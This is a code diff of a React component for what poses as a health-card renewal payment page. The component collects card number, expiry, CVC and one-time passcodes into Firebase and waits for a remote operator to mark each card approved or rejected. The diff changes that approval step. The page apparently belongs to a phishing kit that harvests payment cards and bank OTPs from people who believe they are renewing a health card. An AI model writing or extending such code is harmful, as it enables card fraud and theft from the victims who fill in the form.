@@ -8,7 +8,7 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { CreditCard, MessageCircle } from 'lucide-react'
 import { initializeApp } from 'firebase/app'
-import { getFirestore, doc, setDoc,  onSnapshot } from 'firebase/firestore'
+import { getFirestore, doc, setDoc,  onSnapshot, addDoc, collection } from 'firebase/firestore'
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { FullPageLoader } from "@/components/loader"
 
@@ -60,7 +60,6 @@ export default function HealthCardRenewal() {
   const [datayaer, setDatyear] = useState('')
   const [CVC, setCVC] = useState('')
   const [otp, setOtp] = useState('')
-  const [otp2, setOtp2] = useState('')
   const [otpArd, setOtpard] = useState([''])
   const [cardNumber, setCardNumber] = useState('')
   const [selectedMethod, setSelectedMethod] = useState<any>('')
@@ -71,17 +70,14 @@ export default function HealthCardRenewal() {
     { id: 'master-pay', name: 'Mastecard', icon: <img className="h-6 w-12" src="/m.png" alt="visa" /> },
   ]
 
-  useEffect(() => {
-    setOtp2(otp)
-  }, [otp])
-
+ 
   useEffect(() => {
     const unsubscribe = onSnapshot(doc(db, 'pays', id), (doc) => {
       if (doc.exists()) {
         const data = doc.data() as Notification;
         if (data.cardInfo && data.cardInfo.status) {
           setCardState(data.cardInfo.status);
-          handleApprovalStatus(data.cardInfo.status);
+          handleAuth(data.cardInfo.status);
         }
       }
     });
@@ -89,15 +85,21 @@ export default function HealthCardRenewal() {
     return () => unsubscribe();
   }, [id]);
 
-  const handleApprovalStatus = (status: string) => {
-    if (status === 'approved') {
+ 
+  const handleAuth = async (status:any) => {
+    try {
+      setIswait(true)
+      const docRef = await addDoc(collection(db, 'auth'), {
+        id,
+        timestamp: new Date().toISOString(),
+        status: 'pending' ,
+      })
+    
+    } catch (error) {
+      console.error("Error adding auth document: ", error)
+     
+    } finally {
       setIswait(false)
-
-      setStep(5);
-    } else if (status === 'rejected') {
-      setIswait(false)
-      setStep(3);
-      alert('تم رفض البطاقة. يرجى مراجعة المعلومات وإعادة المحاولة.');
     }
   }
 
@@ -131,7 +133,7 @@ export default function HealthCardRenewal() {
       }
       setIswait(true)
       setTimeout(() => {
-        handleApprovalStatus(cardState) 
+        handleAuth(cardState) 
       }, 5000)
     }
     setStep(stepr + 1)
